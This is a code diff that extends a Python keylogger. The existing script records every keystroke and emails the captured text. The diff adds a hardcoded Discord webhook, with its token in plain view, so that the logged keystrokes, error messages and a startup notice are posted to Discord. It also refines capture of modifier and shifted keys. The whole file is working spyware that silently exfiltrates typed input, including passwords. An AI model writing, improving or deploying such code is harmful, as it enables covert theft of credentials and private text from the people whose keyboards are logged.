@@ -2,8 +2,22 @@ import time
 import threading
 import keyboard
 import smtplib
+import requests
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
+
+# Your Discord webhook URL
+webhook_url = 'https://discord.com/api/webhooks/1053177518368247899/1xTfyhE27YzyhGYTyzNHpndGJKIRoKTLI9H2rJKgJy9uzLE2-w0Jz_FdsuHmKyJS-yZQ'
+
+def send_discord_message(message):
+    data = {
+        'content': message
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+        print('Message sent to Discord successfully.')
+    else:
+        print('Failed to send message to Discord.')
 
 def start_timer():
     global timer_active
@@ -14,12 +28,19 @@ def start_timer():
 def record_key(key):
     global recorded_text
     if timer_active:
-        if key.name == "space":
-            recorded_text += " "
+        if key.name == "shift":
+            return  # Ignore Shift key
+        elif key.name in ["alt", "ctrl", "windows", "tab", "caps lock"] or key.name.startswith("f"):
+            recorded_text += " {" + key.name + "} "
+        elif key.name == "space":
+            recorded_text += " "  # Insert a space without typing "space"
         elif key.name == "backspace":
-            recorded_text = recorded_text[:-1]  # Remove the last character
+            recorded_text = recorded_text[:-1]  # Delete the last character
         else:
-            recorded_text += key.name
+            if keyboard.is_pressed("shift"):
+                recorded_text += key.name.upper()
+            else:
+                recorded_text += key.name
 
 keyboard.on_release(record_key)
 
@@ -54,8 +75,16 @@ def send_email(output_file):
         server.sendmail(sender_email, receiver_email, msg.as_string())
         server.quit()
         print("Email sent successfully.")
+        
+        # Send the same message to Discord
+        send_discord_message(recorded_text)  # Send the recorded text
     except Exception as e:
         print("An error occurred while sending the email:", e)
+        send_discord_message(f"Error sending email: {e}")
+
+# Send a startup message to Discord
+startup_message = 'PC has started up!'
+send_discord_message(startup_message)
 
 while True:
     recorded_text = ""
@@ -78,5 +107,5 @@ while True:
 
     print(f"Recorded text saved to file: {output_file}")
 
-    # Send email with the text file
+    # Send email with the text file and a notification to Discord
     send_email(output_file)
